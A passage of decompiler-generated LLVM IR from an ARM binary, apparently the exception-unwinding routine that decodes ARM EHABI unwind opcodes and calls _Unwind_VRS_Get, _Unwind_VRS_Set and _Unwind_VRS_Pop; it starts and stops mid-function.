  store i1 %v2_18fc4, i1* %cpsr_z.global-to-local, align 1
  %v4_18fcc = load i32, i32* %stack_var_-36, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_18fd8 = load i32, i32* %r6.global-to-local, align 4
  %tmp181 = sub i32 0, %v2_18fd8
  %storemerge160.p = select i1 %v2_18fc4, i32 %v2_18fd8, i32 %tmp181
  %storemerge160 = add i32 %storemerge160.p, %v4_18fcc
  store i32 %storemerge160, i32* %ip.global-to-local, align 4
  %storemerge135 = load i32, i32* @r7, align 4
  store i32 %storemerge135, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %storemerge160, i32* %stack_var_-36, align 4
  %v5_18ff4 = call i32 @_Unwind_VRS_Set(i32 %storemerge135, i32 0, i32 13, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_18ff4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18e6c.backedge

dec_label_pc_18e6c.backedge:                      ; preds = %dec_label_pc_18fa0, %dec_label_pc_1901c, %dec_label_pc_194a0, %dec_label_pc_1916c, %dec_label_pc_191a4, %dec_label_pc_19124, %dec_label_pc_19390
  %v0_18e6c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_18e6c

dec_label_pc_18ffc:                               ; preds = %dec_label_pc_18ecc
  %v7_18ffc = icmp eq i32 %v1_18ecc, 144
  store i1 %v7_18ffc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18ffc, label %dec_label_pc_19004, label %dec_label_pc_19144

dec_label_pc_19004:                               ; preds = %dec_label_pc_18ffc
  %v1_19004 = urem i32 %v0_18ec4, 16
  store i32 %v1_19004, i32* %r2.global-to-local, align 4
  %v2_19008 = icmp eq i32 %v1_19004, 15
  store i1 %v2_19008, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19008, label %.thread21, label %bb153

bb153:                                            ; preds = %dec_label_pc_19004
  %v8_1900c = icmp eq i32 %v1_19004, 13
  store i1 %v8_1900c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_1900c, label %bb154, label %dec_label_pc_1901c

.thread21:                                        ; preds = %dec_label_pc_19004
  store i32 1, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1913c

bb154:                                            ; preds = %bb153
  store i32 1, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1913c

dec_label_pc_1901c:                               ; preds = %bb153
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_19028 = load i32, i32* @r7, align 4
  store i32 %v0_19028, i32* %r0.global-to-local, align 4
  %v5_19030 = call i32 @_Unwind_VRS_Get(i32 %v0_19028, i32 0, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 0, i32* %r1.global-to-local, align 4
  %v0_19038 = load i32, i32* @r7, align 4
  store i32 %v0_19038, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v5_19048 = call i32 @_Unwind_VRS_Set(i32 %v0_19038, i32 0, i32 13, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_19048, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18e6c.backedge

dec_label_pc_19050:                               ; preds = %dec_label_pc_18f88
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_19060 = load i32, i32* @r7, align 4
  store i32 %v0_19060, i32* %r0.global-to-local, align 4
  %v7_19068 = call i32 @_Unwind_VRS_Get(i32 %v0_19060, i32 0, i32 14, i32 0, i8* %tmp146)
  %v0_1906c = load i32, i32* @r7, align 4
  store i32 %v0_1906c, i32* %r0.global-to-local, align 4
  %v0_19070 = load i32, i32* @sl, align 4
  store i32 %v0_19070, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 %v0_19070, i32* %r3.global-to-local, align 4
  %v5_19080 = call i32 @_Unwind_VRS_Set(i32 %v0_1906c, i32 %v0_19070, i32 15, i32 %v0_19070, i8* bitcast (i32* @0 to i8*))
  %v0_19084 = load i32, i32* @sl, align 4
  store i32 %v0_19084, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18f94

dec_label_pc_1908c:                               ; preds = %dec_label_pc_19280
  %v7_1908c = icmp eq i32 %v0_19280, 199
  store i1 %v7_1908c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1908c, label %dec_label_pc_19360, label %dec_label_pc_19094

dec_label_pc_19094:                               ; preds = %dec_label_pc_1908c
  %v1_19094 = and i32 %v0_18ec4, 248
  store i32 %v1_19094, i32* %r3.global-to-local, align 4
  %v7_19098 = icmp eq i32 %v1_19094, 192
  store i1 %v7_19098, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_19098, label %.thread24, label %dec_label_pc_190b0

.thread24:                                        ; preds = %dec_label_pc_19094
  %v2_1909c = urem i32 %v0_18ec4, 16
  %v2_190a0 = add nuw nsw i32 %v2_1909c, 1
  store i32 3, i32* %r1.global-to-local, align 4
  %v2_190a8 = or i32 %v2_190a0, 655360
  store i32 %v2_190a8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1916c

dec_label_pc_190b0:                               ; preds = %dec_label_pc_19094
  %v7_190b0 = icmp eq i32 %v0_19280, 200
  store i1 %v7_190b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_190b0, label %dec_label_pc_192f4, label %dec_label_pc_190b8

dec_label_pc_190b8:                               ; preds = %dec_label_pc_190b0
  %v7_190b8 = icmp eq i32 %v0_19280, 201
  store i1 %v7_190b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_190b8, label %dec_label_pc_190c0, label %dec_label_pc_1913c

dec_label_pc_190c0:                               ; preds = %dec_label_pc_190b8
  %v0_190c0 = load i32, i32* @r5, align 4
  %v1_190c0 = add i32 %v0_190c0, 8
  %v2_190c0 = inttoptr i32 %v1_190c0 to i8*
  %v3_190c0 = load i8, i8* %v2_190c0, align 1
  %v4_190c0 = zext i8 %v3_190c0 to i32
  store i32 %v4_190c0, i32* %r3.global-to-local, align 4
  %v2_190c4 = icmp eq i8 %v3_190c0, 0
  store i1 %v2_190c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_190c4, label %dec_label_pc_190d4, label %.thread26

.thread26:                                        ; preds = %dec_label_pc_190c0
  %v2_190c8 = add nsw i32 %v4_190c0, -1
  store i32 %v2_190c8, i32* %r3.global-to-local, align 4
  %v2_190cc = trunc i32 %v2_190c8 to i8
  store i8 %v2_190cc, i8* %v2_190c0, align 1
  %v0_190d0.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_190d0.pr.pr, label %.thread26.dec_label_pc_190d4_crit_edge, label %dec_label_pc_19108

.thread26.dec_label_pc_190d4_crit_edge:           ; preds = %.thread26
  %v0_190d4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_190d4

dec_label_pc_190d4:                               ; preds = %.thread26.dec_label_pc_190d4_crit_edge, %dec_label_pc_190c0
  %v2_190ec = phi i32 [ %v0_190d4.pre, %.thread26.dec_label_pc_190d4_crit_edge ], [ %v0_190c0, %dec_label_pc_190c0 ]
  %v1_190d4 = add i32 %v2_190ec, 9
  %v2_190d4 = inttoptr i32 %v1_190d4 to i8*
  %v3_190d4 = load i8, i8* %v2_190d4, align 1
  %v4_190d4 = zext i8 %v3_190d4 to i32
  store i32 %v4_190d4, i32* %r3.global-to-local, align 4
  %v2_190d8 = icmp eq i8 %v3_190d4, 0
  store i1 %v2_190d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_190d8, label %dec_label_pc_19124, label %dec_label_pc_190e8

dec_label_pc_190e8:                               ; preds = %dec_label_pc_190d4
  %v1_190e8 = add nsw i32 %v4_190d4, -1
  store i32 %v1_190e8, i32* %r3.global-to-local, align 4
  %v1_190ec = trunc i32 %v1_190e8 to i8
  store i8 %v1_190ec, i8* %v2_190d4, align 1
  %v0_190f0 = load i32, i32* @r5, align 4
  %v1_190f0 = add i32 %v0_190f0, 4
  %v2_190f0 = inttoptr i32 %v1_190f0 to i32*
  %v3_190f0 = load i32, i32* %v2_190f0, align 4
  store i32 %v3_190f0, i32* %r2.global-to-local, align 4
  %v1_190f4 = inttoptr i32 %v3_190f0 to i32*
  %v2_190f4 = load i32, i32* %v1_190f4, align 4
  store i32 %v2_190f4, i32* %r0.global-to-local, align 4
  %v4_190f4 = add i32 %v3_190f0, 4
  store i32 %v4_190f4, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_190f4, i32* %v2_190f0, align 4
  %v0_19100 = load i32, i32* %r3.global-to-local, align 4
  %v1_19100 = trunc i32 %v0_19100 to i8
  %v2_19100 = load i32, i32* @r5, align 4
  %v3_19100 = add i32 %v2_19100, 8
  %v4_19100 = inttoptr i32 %v3_19100 to i8*
  store i8 %v1_19100, i8* %v4_19100, align 1
  %v0_19104 = load i32, i32* %r0.global-to-local, align 4
  %v1_19104 = load i32, i32* @r5, align 4
  %v2_19104 = inttoptr i32 %v1_19104 to i32*
  store i32 %v0_19104, i32* %v2_19104, align 4
  br label %dec_label_pc_19108

dec_label_pc_19108:                               ; preds = %.thread26, %dec_label_pc_190e8
  %v0_19108 = load i32, i32* %r0.global-to-local, align 4
  %v3_19108 = udiv i32 %v0_19108, 16777216
  %v1_1910c = urem i32 %v3_19108, 16
  %v3_19110 = mul i32 %v0_19108, 256
  %v1_19114 = add nuw nsw i32 %v1_1910c, 1
  store i32 %v1_19114, i32* %r1.global-to-local, align 4
  %v1_19118 = and i32 %v3_19108, 240
  store i32 %v1_19118, i32* %r3.global-to-local, align 4
  %v1_1911c = load i32, i32* @r5, align 4
  %v2_1911c = inttoptr i32 %v1_1911c to i32*
  store i32 %v3_19110, i32* %v2_1911c, align 4
  %v0_19120 = load i32, i32* %r1.global-to-local, align 4
  %v1_19120 = load i32, i32* %r3.global-to-local, align 4
  %v4_19120 = mul i32 %v1_19120, 4096
  %v5_19120 = or i32 %v4_19120, %v0_19120
  br label %dec_label_pc_19124

dec_label_pc_19124:                               ; preds = %dec_label_pc_190d4, %dec_label_pc_19108
  %storemerge = phi i32 [ %v5_19120, %dec_label_pc_19108 ], [ 720897, %dec_label_pc_190d4 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v0_19124 = load i32, i32* @r7, align 4
  store i32 %v0_19124, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r3.global-to-local, align 4
  %v4_19130 = call i32 @_Unwind_VRS_Pop(i32 %v0_19124, i32 1, i32 5, i32 5)
  store i32 %v4_19130, i32* %r0.global-to-local, align 4
  %v2_19134 = icmp eq i32 %v4_19130, 0
  store i1 %v2_19134, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19134, label %dec_label_pc_18e6c.backedge, label %dec_label_pc_1913c

dec_label_pc_1913c:                               ; preds = %dec_label_pc_19388, %dec_label_pc_190b8, %dec_label_pc_19198, %dec_label_pc_1953c, %dec_label_pc_1950c, %dec_label_pc_194e8, %dec_label_pc_19374, %dec_label_pc_19124, %dec_label_pc_18f38, %dec_label_pc_18f2c, %bb154, %.thread21
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18f94

dec_label_pc_19144:                               ; preds = %dec_label_pc_18ffc
  %v7_19144 = icmp eq i32 %v1_18ecc, 160
  store i1 %v7_19144, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_19144, label %dec_label_pc_1914c, label %dec_label_pc_19188

dec_label_pc_1914c:                               ; preds = %dec_label_pc_19144
  %v0_1914c = load i32, i32* %ip.global-to-local, align 4
  %v1_1914c = urem i32 %v0_1914c, 8
  %v1_19150 = xor i32 %v1_1914c, 7
  store i32 %v1_19150, i32* %r3.global-to-local, align 4
  %v6_19158 = lshr i32 4080, %v1_19150
  %v1_1915c = and i32 %v0_18ec4, 8
  %v2_1915c = icmp eq i32 %v1_1915c, 0
  store i1 %v2_1915c, i1* %cpsr_z.global-to-local, align 1
  %v1_19160 = and i32 %v6_19158, 4080
  %tmp155 = mul nuw nsw i32 %v1_1915c, 2048
  %tmp156 = or i32 %v1_19160, %tmp155
  store i32 %tmp156, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1916c

dec_label_pc_1916c:                               ; preds = %.thread44, %.thread24, %dec_label_pc_194fc.dec_label_pc_1916c_crit_edge, %bb157, %dec_label_pc_19358, %dec_label_pc_192ec, %dec_label_pc_1924c, %dec_label_pc_1914c
  %v2_19174 = phi i32 [ %v2_19270, %.thread44 ], [ %v2_19278, %bb157 ], [ %v2_19174.pre, %dec_label_pc_194fc.dec_label_pc_1916c_crit_edge ], [ %v2_190a8, %.thread24 ], [ %storemerge130, %dec_label_pc_19358 ], [ %storemerge131, %dec_label_pc_192ec ], [ %storemerge132, %dec_label_pc_1924c ], [ %tmp156, %dec_label_pc_1914c ]
  %v0_19170 = phi i32 [ 2, %.thread44 ], [ 1, %bb157 ], [ 0, %dec_label_pc_194fc.dec_label_pc_1916c_crit_edge ], [ 3, %.thread24 ], [ 2, %dec_label_pc_19358 ], [ 3, %dec_label_pc_192ec ], [ 1, %dec_label_pc_1924c ], [ 0, %dec_label_pc_1914c ]
  %v0_1916c = load i32, i32* @r7, align 4
  store i32 %v0_1916c, i32* %r0.global-to-local, align 4
  store i32 %v0_19170, i32* %r3.global-to-local, align 4
  %v4_19174 = call i32 @_Unwind_VRS_Pop(i32 %v0_1916c, i32 %v0_19170, i32 %v2_19174, i32 %v0_19170)
  store i32 %v4_19174, i32* %r0.global-to-local, align 4
  %v2_19178 = icmp eq i32 %v4_19174, 0
  store i1 %v2_19178, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19178, label %dec_label_pc_18e6c.backedge, label %dec_label_pc_19180

dec_label_pc_19180:                               ; preds = %dec_label_pc_1916c
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18f94

dec_label_pc_19188:                               ; preds = %dec_label_pc_19144
  %v7_19188 = icmp eq i32 %v1_18ecc, 176
  store i1 %v7_19188, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_19188, label %dec_label_pc_191d0, label %dec_label_pc_19190

dec_label_pc_19190:                               ; preds = %dec_label_pc_19188
  %v7_19190 = icmp eq i32 %v1_18ecc, 192
  store i1 %v7_19190, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_19190, label %dec_label_pc_19280, label %dec_label_pc_19198

dec_label_pc_19198:                               ; preds = %dec_label_pc_19190
  %v1_19198 = and i32 %v0_18ec4, 248
  store i32 %v1_19198, i32* %r3.global-to-local, align 4
  %v7_1919c = icmp eq i32 %v1_19198, 208
  store i1 %v7_1919c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1919c, label %dec_label_pc_191a4, label %dec_label_pc_1913c

dec_label_pc_191a4:                               ; preds = %dec_label_pc_19198
  %v1_191a4 = urem i32 %v0_18ec4, 8
  %v1_191a8 = add nuw nsw i32 %v1_191a4, 1
  %v1_191ac = or i32 %v1_191a8, 524288
  store i32 %v1_191ac, i32* %r2.global-to-local, align 4
  %v0_191b0 = load i32, i32* @r7, align 4
  store i32 %v0_191b0, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r3.global-to-local, align 4
  %v4_191bc = call i32 @_Unwind_VRS_Pop(i32 %v0_191b0, i32 1, i32 %v1_191ac, i32 5)
  store i32 %v4_191bc, i32* %r0.global-to-local, align 4
  %v2_191c0 = icmp eq i32 %v4_191bc, 0
  store i1 %v2_191c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_191c0, label %dec_label_pc_18e6c.backedge, label %dec_label_pc_191c8

dec_label_pc_191c8:                               ; preds = %dec_label_pc_191a4
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18f94

dec_label_pc_191d0:                               ; preds = %dec_label_pc_19188
  %v0_191d0 = load i32, i32* %ip.global-to-local, align 4
  %v7_191d0 = icmp eq i32 %v0_191d0, 177
  store i1 %v7_191d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_191d0, label %dec_label_pc_194d4, label %dec_label_pc_191d8

dec_label_pc_191d8:                               ; preds = %dec_label_pc_191d0
  %v7_191d8 = icmp eq i32 %v0_191d0, 178
  store i1 %v7_191d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_191d8, label %dec_label_pc_193ac, label %dec_label_pc_191e0

dec_label_pc_191e0:                               ; preds = %dec_label_pc_191d8
  %v7_191e0 = icmp eq i32 %v0_191d0, 179
  store i1 %v7_191e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_191e0, label %dec_label_pc_191e8, label %dec_label_pc_19254

dec_label_pc_191e8:                               ; preds = %dec_label_pc_191e0
  %v0_191e8 = load i32, i32* @r5, align 4
  %v1_191e8 = add i32 %v0_191e8, 8
  %v2_191e8 = inttoptr i32 %v1_191e8 to i8*
  %v3_191e8 = load i8, i8* %v2_191e8, align 1
  %v4_191e8 = zext i8 %v3_191e8 to i32
  store i32 %v4_191e8, i32* %r3.global-to-local, align 4
  %v2_191ec = icmp eq i8 %v3_191e8, 0
  store i1 %v2_191ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_191ec, label %dec_label_pc_191fc, label %.thread30

.thread30:                                        ; preds = %dec_label_pc_191e8
  %v2_191f0 = add nsw i32 %v4_191e8, -1
  store i32 %v2_191f0, i32* %r3.global-to-local, align 4
  %v2_191f4 = trunc i32 %v2_191f0 to i8
  store i8 %v2_191f4, i8* %v2_191e8, align 1
  %v0_191f8.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_191f8.pr.pr, label %.thread30.dec_label_pc_191fc_crit_edge, label %dec_label_pc_19230

.thread30.dec_label_pc_191fc_crit_edge:           ; preds = %.thread30
  %v0_191fc.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_191fc

dec_label_pc_191fc:                               ; preds = %.thread30.dec_label_pc_191fc_crit_edge, %dec_label_pc_191e8
  %v2_19214 = phi i32 [ %v0_191fc.pre, %.thread30.dec_label_pc_191fc_crit_edge ], [ %v0_191e8, %dec_label_pc_191e8 ]
  %v1_191fc = add i32 %v2_19214, 9
  %v2_191fc = inttoptr i32 %v1_191fc to i8*
  %v3_191fc = load i8, i8* %v2_191fc, align 1
  %v4_191fc = zext i8 %v3_191fc to i32
  store i32 %v4_191fc, i32* %r3.global-to-local, align 4
  %v2_19200 = icmp eq i8 %v3_191fc, 0
  store i1 %v2_19200, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19200, label %dec_label_pc_1924c, label %dec_label_pc_19210

dec_label_pc_19210:                               ; preds = %dec_label_pc_191fc
  %v1_19210 = add nsw i32 %v4_191fc, -1
  store i32 %v1_19210, i32* %r3.global-to-local, align 4
  %v1_19214 = trunc i32 %v1_19210 to i8
  store i8 %v1_19214, i8* %v2_191fc, align 1
  %v0_19218 = load i32, i32* @r5, align 4
  %v1_19218 = add i32 %v0_19218, 4
  %v2_19218 = inttoptr i32 %v1_19218 to i32*
  %v3_19218 = load i32, i32* %v2_19218, align 4
  store i32 %v3_19218, i32* %r2.global-to-local, align 4
  %v1_1921c = inttoptr i32 %v3_19218 to i32*
  %v2_1921c = load i32, i32* %v1_1921c, align 4
  store i32 %v2_1921c, i32* %r0.global-to-local, align 4
  %v4_1921c = add i32 %v3_19218, 4
  store i32 %v4_1921c, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_1921c, i32* %v2_19218, align 4
  %v0_19228 = load i32, i32* %r3.global-to-local, align 4
  %v1_19228 = trunc i32 %v0_19228 to i8
  %v2_19228 = load i32, i32* @r5, align 4
  %v3_19228 = add i32 %v2_19228, 8
  %v4_19228 = inttoptr i32 %v3_19228 to i8*
  store i8 %v1_19228, i8* %v4_19228, align 1
  %v0_1922c = load i32, i32* %r0.global-to-local, align 4
  %v1_1922c = load i32, i32* @r5, align 4
  %v2_1922c = inttoptr i32 %v1_1922c to i32*
  store i32 %v0_1922c, i32* %v2_1922c, align 4
  br label %dec_label_pc_19230

dec_label_pc_19230:                               ; preds = %.thread30, %dec_label_pc_19210
  %v0_19230 = load i32, i32* %r0.global-to-local, align 4
  %v3_19230 = udiv i32 %v0_19230, 16777216
  %v1_19234 = urem i32 %v3_19230, 16
  %v3_19238 = mul i32 %v0_19230, 256
  store i32 %v3_19238, i32* %r0.global-to-local, align 4
  %v1_1923c = add nuw nsw i32 %v1_19234, 1
  store i32 %v1_1923c, i32* %r2.global-to-local, align 4
  %v1_19240 = and i32 %v3_19230, 240
  store i32 %v1_19240, i32* %r3.global-to-local, align 4
  %v1_19244 = load i32, i32* @r5, align 4
  %v2_19244 = inttoptr i32 %v1_19244 to i32*
  store i32 %v3_19238, i32* %v2_19244, align 4
  %v0_19248 = load i32, i32* %r2.global-to-local, align 4
  %v1_19248 = load i32, i32* %r3.global-to-local, align 4
  %v4_19248 = mul i32 %v1_19248, 4096
  %v5_19248 = or i32 %v4_19248, %v0_19248
  br label %dec_label_pc_1924c

dec_label_pc_1924c:                               ; preds = %dec_label_pc_191fc, %dec_label_pc_19230
  %storemerge132 = phi i32 [ %v5_19248, %dec_label_pc_19230 ], [ 720897, %dec_label_pc_191fc ]
  store i32 %storemerge132, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1916c

dec_label_pc_19254:                               ; preds = %dec_label_pc_191e0
  %v1_19254 = and i32 %v0_18ec4, 252
  store i32 %v1_19254, i32* %r3.global-to-local, align 4
  %v7_19258 = icmp eq i32 %v1_19254, 180
  store i1 %v7_19258, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_19258, label %.thread44, label %bb157

.thread44:                                        ; preds = %dec_label_pc_19254
  %v2_1925c = urem i32 %v0_18ec4, 4
  %v2_19264 = add nuw nsw i32 %v2_1925c, 1
  store i32 2, i32* %r1.global-to-local, align 4
  %v2_19270 = or i32 %v2_19264, 262144
  store i32 %v2_19270, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1916c

bb157:                                            ; preds = %dec_label_pc_19254
  %v2_19260 = urem i32 %v0_191d0, 8
  %v2_19268 = add nuw nsw i32 %v2_19260, 1
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_19278 = or i32 %v2_19268, 524288
  store i32 %v2_19278, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1916c

dec_label_pc_19280:                               ; preds = %dec_label_pc_19190
  %v0_19280 = load i32, i32* %ip.global-to-local, align 4
  %v7_19280 = icmp eq i32 %v0_19280, 198
  store i1 %v7_19280, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_19280, label %dec_label_pc_19288, label %dec_label_pc_1908c

dec_label_pc_19288:                               ; preds = %dec_label_pc_19280
  %v0_19288 = load i32, i32* @r5, align 4
  %v1_19288 = add i32 %v0_19288, 8
  %v2_19288 = inttoptr i32 %v1_19288 to i8*
  %v3_19288 = load i8, i8* %v2_19288, align 1
  %v4_19288 = zext i8 %v3_19288 to i32
  store i32 %v4_19288, i32* %r3.global-to-local, align 4
  %v2_1928c = icmp eq i8 %v3_19288, 0
  store i1 %v2_1928c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1928c, label %dec_label_pc_1929c, label %.thread48

.thread48:                                        ; preds = %dec_label_pc_19288
  %v2_19290 = add nsw i32 %v4_19288, -1
  store i32 %v2_19290, i32* %r3.global-to-local, align 4
  %v2_19294 = trunc i32 %v2_19290 to i8
  store i8 %v2_19294, i8* %v2_19288, align 1
  %v0_19298.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_19298.pr.pr, label %.thread48.dec_label_pc_1929c_crit_edge, label %dec_label_pc_192d0

.thread48.dec_label_pc_1929c_crit_edge:           ; preds = %.thread48
  %v0_1929c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1929c

dec_label_pc_1929c:                               ; preds = %.thread48.dec_label_pc_1929c_crit_edge, %dec_label_pc_19288
  %v2_192b4 = phi i32 [ %v0_1929c.pre, %.thread48.dec_label_pc_1929c_crit_edge ], [ %v0_19288, %dec_label_pc_19288 ]
  %v1_1929c = add i32 %v2_192b4, 9
  %v2_1929c = inttoptr i32 %v1_1929c to i8*
  %v3_1929c = load i8, i8* %v2_1929c, align 1
  %v4_1929c = zext i8 %v3_1929c to i32
  store i32 %v4_1929c, i32* %r3.global-to-local, align 4
  %v2_192a0 = icmp eq i8 %v3_1929c, 0
  store i1 %v2_192a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_192a0, label %dec_label_pc_192ec, label %dec_label_pc_192b0

dec_label_pc_192b0:                               ; preds = %dec_label_pc_1929c
  %v1_192b0 = add nsw i32 %v4_1929c, -1
  store i32 %v1_192b0, i32* %r3.global-to-local, align 4
  %v1_192b4 = trunc i32 %v1_192b0 to i8
  store i8 %v1_192b4, i8* %v2_1929c, align 1
  %v0_192b8 = load i32, i32* @r5, align 4
  %v1_192b8 = add i32 %v0_192b8, 4
  %v2_192b8 = inttoptr i32 %v1_192b8 to i32*
  %v3_192b8 = load i32, i32* %v2_192b8, align 4
  store i32 %v3_192b8, i32* %r2.global-to-local, align 4
  %v1_192bc = inttoptr i32 %v3_192b8 to i32*
  %v2_192bc = load i32, i32* %v1_192bc, align 4
  store i32 %v2_192bc, i32* %r0.global-to-local, align 4
  %v4_192bc = add i32 %v3_192b8, 4
  store i32 %v4_192bc, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_192bc, i32* %v2_192b8, align 4
  %v0_192c8 = load i32, i32* %r3.global-to-local, align 4
  %v1_192c8 = trunc i32 %v0_192c8 to i8
  %v2_192c8 = load i32, i32* @r5, align 4
  %v3_192c8 = add i32 %v2_192c8, 8
  %v4_192c8 = inttoptr i32 %v3_192c8 to i8*
  store i8 %v1_192c8, i8* %v4_192c8, align 1
  %v0_192cc = load i32, i32* %r0.global-to-local, align 4
  %v1_192cc = load i32, i32* @r5, align 4
  %v2_192cc = inttoptr i32 %v1_192cc to i32*
  store i32 %v0_192cc, i32* %v2_192cc, align 4
  br label %dec_label_pc_192d0

dec_label_pc_192d0:                               ; preds = %.thread48, %dec_label_pc_192b0
  %v0_192d0 = load i32, i32* %r0.global-to-local, align 4
  %v3_192d0 = udiv i32 %v0_192d0, 16777216
  %v1_192d4 = urem i32 %v3_192d0, 16
  %v3_192d8 = mul i32 %v0_192d0, 256
  store i32 %v3_192d8, i32* %r0.global-to-local, align 4
  %v1_192dc = add nuw nsw i32 %v1_192d4, 1
  store i32 %v1_192dc, i32* %r2.global-to-local, align 4
  %v1_192e0 = and i32 %v3_192d0, 240
  store i32 %v1_192e0, i32* %r3.global-to-local, align 4
  %v1_192e4 = load i32, i32* @r5, align 4
  %v2_192e4 = inttoptr i32 %v1_192e4 to i32*
  store i32 %v3_192d8, i32* %v2_192e4, align 4
  %v0_192e8 = load i32, i32* %r2.global-to-local, align 4
  %v1_192e8 = load i32, i32* %r3.global-to-local, align 4
  %v4_192e8 = mul i32 %v1_192e8, 4096
  %v5_192e8 = or i32 %v4_192e8, %v0_192e8
  br label %dec_label_pc_192ec

dec_label_pc_192ec:                               ; preds = %dec_label_pc_1929c, %dec_label_pc_192d0
  %storemerge131 = phi i32 [ %v5_192e8, %dec_label_pc_192d0 ], [ 720897, %dec_label_pc_1929c ]
  store i32 %storemerge131, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1916c

dec_label_pc_192f4:                               ; preds = %dec_label_pc_190b0
  %v0_192f4 = load i32, i32* @r5, align 4
  %v1_192f4 = add i32 %v0_192f4, 8
  %v2_192f4 = inttoptr i32 %v1_192f4 to i8*
  %v3_192f4 = load i8, i8* %v2_192f4, align 1
  %v4_192f4 = zext i8 %v3_192f4 to i32
  store i32 %v4_192f4, i32* %r3.global-to-local, align 4
  %v2_192f8 = icmp eq i8 %v3_192f4, 0
  store i1 %v2_192f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_192f8, label %dec_label_pc_19308, label %.thread52

.thread52:                                        ; preds = %dec_label_pc_192f4
  %v2_192fc = add nsw i32 %v4_192f4, -1
  store i32 %v2_192fc, i32* %r3.global-to-local, align 4
  %v2_19300 = trunc i32 %v2_192fc to i8
  store i8 %v2_19300, i8* %v2_192f4, align 1
  %v0_19304.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_19304.pr.pr, label %.thread52.dec_label_pc_19308_crit_edge, label %dec_label_pc_1933c

.thread52.dec_label_pc_19308_crit_edge:           ; preds = %.thread52
  %v0_19308.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_19308

dec_label_pc_19308:                               ; preds = %.thread52.dec_label_pc_19308_crit_edge, %dec_label_pc_192f4
  %v2_19320 = phi i32 [ %v0_19308.pre, %.thread52.dec_label_pc_19308_crit_edge ], [ %v0_192f4, %dec_label_pc_192f4 ]
  %v1_19308 = add i32 %v2_19320, 9
  %v2_19308 = inttoptr i32 %v1_19308 to i8*
  %v3_19308 = load i8, i8* %v2_19308, align 1
  %v4_19308 = zext i8 %v3_19308 to i32
  store i32 %v4_19308, i32* %r3.global-to-local, align 4
  %v2_1930c = icmp eq i8 %v3_19308, 0
  store i1 %v2_1930c, i1* %cpsr_z.global-to-local, align 1
